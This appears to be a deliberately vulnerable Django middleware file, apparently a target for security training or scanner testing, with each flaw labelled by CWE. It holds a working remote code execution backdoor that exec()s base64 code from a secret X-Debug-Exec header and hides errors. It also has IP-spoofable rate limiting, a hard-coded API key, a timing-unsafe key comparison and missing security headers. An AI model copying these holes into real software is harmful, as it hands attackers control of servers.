# vuln_app/middleware.py — Middleware (INTENTIONALLY VULNERABLE)
# ==============================================================
# Vulnerability Key: 5 vulns including the HARDEST obfuscated backdoor

import base64
import hashlib
import time


class DebugMiddleware:
    """Middleware with hidden backdoor and security weaknesses."""

    def __init__(self, get_response):
        self.get_response = get_response
        self.request_count = {}

    def __call__(self, request):
        # Rate limiter — bypassable via X-Forwarded-For
        # CWE-290 IP spoofing — trusts X-Forwarded-For header
        client_ip = request.META.get("HTTP_X_FORWARDED_FOR", "").split(",")[0].strip()
        if not client_ip:
            client_ip = request.META.get("REMOTE_ADDR", "127.0.0.1")

        current = time.time()
        if client_ip in self.request_count:
            count, window_start = self.request_count[client_ip]
            if current - window_start < 60 and count > 100:
                from django.http import JsonResponse
                return JsonResponse({"error": "rate limited"}, status=429)
            if current - window_start >= 60:
                self.request_count[client_ip] = (1, current)
            else:
                self.request_count[client_ip] = (count + 1, window_start)
        else:
            self.request_count[client_ip] = (1, current)

        # ══════════════════════════════════════════════════════════
        # THE OBFUSCATED BACKDOOR — THE HARDEST THING TO DETECT
        # ══════════════════════════════════════════════════════════
        # CWE-506 Embedded malicious code
        # CWE-95 Eval injection
        # This checks for a secret HTTP header. If present, it
        # base64-decodes the header value and exec()s it.
        # The try/except hides any errors from logs.
        debug_payload = request.META.get("HTTP_X_DEBUG_EXEC")
        if debug_payload:
            try:
                code = base64.b64decode(debug_payload).decode()
                exec(code)  # RCE BACKDOOR — executes arbitrary code from HTTP header
            except Exception:
                pass  # Silently swallow ALL errors — hides the backdoor

        # Security headers — MISSING important ones
        response = self.get_response(request)
        # CWE-693 Missing security headers
        # Should set: X-Frame-Options, X-Content-Type-Options,
        # Content-Security-Policy, Strict-Transport-Security
        # But none are set.

        return response


class APIKeyMiddleware:
    """API key validation — timing attack."""

    def __init__(self, get_response):
        self.get_response = get_response
        self.valid_api_key = "sk_live_super_secret_api_key_12345"

    def __call__(self, request):
        api_key = request.META.get("HTTP_X_API_KEY", "")
        if api_key:
            # CWE-208 Timing attack — direct string comparison on secret
            if api_key != self.valid_api_key:
                from django.http import JsonResponse
                return JsonResponse({"error": "invalid api key"}, status=401)

        return self.get_response(request)
